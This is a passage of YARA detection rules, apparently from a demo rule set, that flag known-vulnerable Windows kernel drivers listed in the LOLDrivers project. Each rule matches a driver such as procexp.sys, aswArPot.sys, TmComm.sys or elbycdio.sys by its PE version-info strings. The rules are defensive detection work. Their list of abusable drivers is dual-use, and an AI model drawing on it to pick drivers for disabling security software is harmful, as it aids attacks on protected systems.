0043006f006d00700061006e0079004e0061006d0065[1-8]00540065006e004100730079007300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e00310034003000390031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004e00740069006d0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300032002d0032003000310034002000620079002000540065006e004100730079007300200043006f00720070006f0072006100740069006f006e002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_BDBC_RID465F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:15:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310031002e00300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310031002e00300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000300037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Databaseharborsoftware_Sysinfodetectorxsys_Sysinfodetector_45E5_RID4624 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SysInfoDetectorX64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:05:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00440072006900760065007200200066006f007200200053007900730049006e0066006f0020004400650074006500630074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0044006100740061006200610073006500200048006100720062006f007200200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0053007900730049006e0066006f004400650074006500630074006f0072005800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007900730049006e0066006f0020004400650074006500630074006f0072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0053007900730049006e0066006f004400650074006500630074006f0072005800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300031003400200044006100740061006200610073006500200048006100720062006f007200200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_7048_RID3BA8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:38:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003600200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_7837_RID3DA5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:03:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00360030002e0030002e0031003000350036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00360030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmelsys_Trendmicroearlylaunchantimalwaredriver_E505_RID46D3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Tmel.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:35:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200045004c0041004d00200044007200690076006500720020002800360034002d0042006900740029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0030002e0031003000300034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f0020004500610072006c00790020004c00610075006e0063006800200041006e00740069002d004d0061006c00770061007200650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0065006c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ncrcorporation_Radhwmgrsys_Ncrcorporationhardwaremanagerdriver_Dev_DF96_RID494F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RadHwMgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:21:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061006400690061006e00740020004800610072006400770061007200650020004d0061006e006100670065007200200066006f007200200050003100350078007800200050006c006100740066006f0072006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0043005200200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0030002e0030002e003200200044006500760020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0030002e0030002e00320020004400650076 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e0043005200200043006f00720070006f0072006100740069006f006e0020004800610072006400770061007200650020004d0061006e00610067006500720020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000300032002d00320030003100370020004e0043005200200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_0B2A_RID466E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:18:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0037002e0034003000330031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0037002e0034003000330031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Tenasyscorporation_Rtifsys_Intime_BA40_RID3BBA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtif.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:41:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004e00740069006d006500200050006e00500020005200540020004b00650072006e0065006c00200049006e00740065007200660061006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00540065006e004100730079007300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e00310034003100370035002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004e00740069006d0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300032002d0032003000310034002000620079002000540065006e004100730079007300200043006f00720070006f0072006100740069006f006e002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_828A_RID3BB8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:41:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxusbmonsys_Virtualboxusbmonitordriver_8A24_RID4703 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxUSBMon.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:43:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200055005300420020004d006f006e00690074006f00720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005500530042004d006f006e002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200055005300420020004d006f006e00690074006f00720020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005500530042004d006f006e002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Copyright_Advancedmalwareprotection_6F55_RID3C68 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - amsdk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:10:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041006400760061006e0063006500640020004d0061006c0077006100720065002000500072006f00740065006300740069006f006e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043006f007000790072006900670068007400200032003000310038002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0030002e0030002e003000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0030002e0030002e003000300030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006400760061006e0063006500640020004d0061006c0077006100720065002000500072006f00740065006300740069006f006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005a0041004d002e006500780065 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200032003000310038002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_0DC4_RID3BC0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:42:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003500200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tenasyscorporation_Rtifsys_Intime_3670_RID3BA3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtif.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:37:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004e00740069006d006500200050006e00500020005200540020004b00650072006e0065006c00200049006e00740065007200660061006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00540065006e004100730079007300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0032002e00310037003000350032002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004e00740069006d0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300032002d0032003000310037002000620079002000540065006e004100730079007300200043006f00720070006f0072006100740069006f006e002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_EEA5_RID3BD5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:46:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200032002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003900200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_9CA5_RID3BC7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:43:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_4E54_RID3D4C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:48:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003200300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003000390020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_2D2C_RID3E13 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:21:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 